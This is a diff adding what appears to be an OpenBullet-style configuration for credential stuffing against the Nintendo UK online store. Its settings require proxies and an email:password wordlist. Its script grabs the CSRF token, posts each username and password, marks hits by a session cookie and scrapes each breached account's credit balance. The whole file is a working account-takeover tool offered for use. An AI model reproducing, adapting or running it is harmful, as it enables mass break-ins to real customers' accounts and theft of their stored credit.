@@ -1,0 +1,53 @@
+[SETTINGS]
+{
+  "Name": "Nintendo",
+  "SuggestedBots": 50,
+  "LastModified": "2018-07-23T22:49:08.4557235+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://store.nintendo.co.uk/login.jsp?returnTo=https%3A%2F%2Fstore.nintendo.co.uk%2FaccountCredit.account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<COOKIES(csrf_token)>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://store.nintendo.co.uk/elysiumAuthentication.login" AutoRedirect=TRUE 
+  CONTENT "elysium_username=<USER>&elysium_password=<PASS>&returnTo=https%3A%2F%2Fstore.nintendo.co.uk%2FaccountCredit.account&csrf_token=<TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://store.nintendo.co.uk/login.jsp?returnTo=https%3A%2F%2Fstore.nintendo.co.uk%2FaccountCredit.account" 
+  HEADER "Origin: https://store.nintendo.co.uk" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "login_alertDanger" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "user_id_V6" 
+REQUEST GET "https://store.nintendo.co.uk/accountCredit.account" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" CSS "[class=myAccountSection_accountCredit_title]" "innerHTML" 0 -> CAP "CREDIT" "" "" 
